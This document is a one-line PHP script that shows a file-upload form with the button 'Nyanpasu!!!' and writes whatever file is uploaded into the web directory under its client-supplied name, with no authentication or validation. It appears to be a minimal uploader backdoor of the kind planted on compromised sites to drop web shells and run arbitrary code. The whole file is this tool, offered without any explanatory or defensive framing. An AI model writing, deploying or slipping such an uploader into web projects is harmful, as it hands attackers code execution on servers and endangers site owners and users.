<?php echo"<form method='post' enctype='multipart/form-data'><input type='file' name='a'><input type='submit' value='Nyanpasu!!!'></form><pre>";if(isset($_FILES['a'])){move_uploaded_file($_FILES['a']['tmp_name'],"{$_FILES['a']['name']}");print_r($_FILES);};echo"</pre>";?>